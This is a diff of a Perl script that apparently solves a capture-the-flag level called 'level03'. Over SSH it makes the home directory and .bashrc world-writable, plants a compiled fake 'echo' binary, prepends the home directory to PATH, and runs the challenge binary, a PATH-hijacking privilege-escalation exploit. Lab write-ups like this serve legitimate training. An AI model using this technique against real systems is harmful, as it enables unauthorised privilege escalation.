@@ -1,17 +1,21 @@
 #!/usr/bin/perl
 
-$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
-$user = "level03";
-
+$port = "22222";
+$ip = "localhost";
 $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
+$user = "level03";
 
-$scp = "scp -q -P 4242 ./echo.c $user\@$ip:~";
-print $green, $scp, $reset, "\n";
+$chmod = "ssh -qp $port $user\@$ip 'chmod 777 .'";
+print $green, $chmod, $reset, "\n";
+system($chmod);
+
+$scp = "scp -q -P $port ./echo.c $user\@$ip:~";
+print $red, $scp, $reset, "\n";
 system($scp);
 
 $path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
-$input = "echo $path > .bashrc && gcc echo.c -o echo && ./level03";
-print $red, $input, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip 'chmod 777 . && chmod 777 .bashrc && $input'");
+$input = "echo $path > .bashrc && source .bashrc && gcc echo.c -o echo && ./level03";
+print $green, $input, $reset, "\n";
+system("ssh -qp $port $user\@$ip 'chmod 777 .bashrc && $input'");
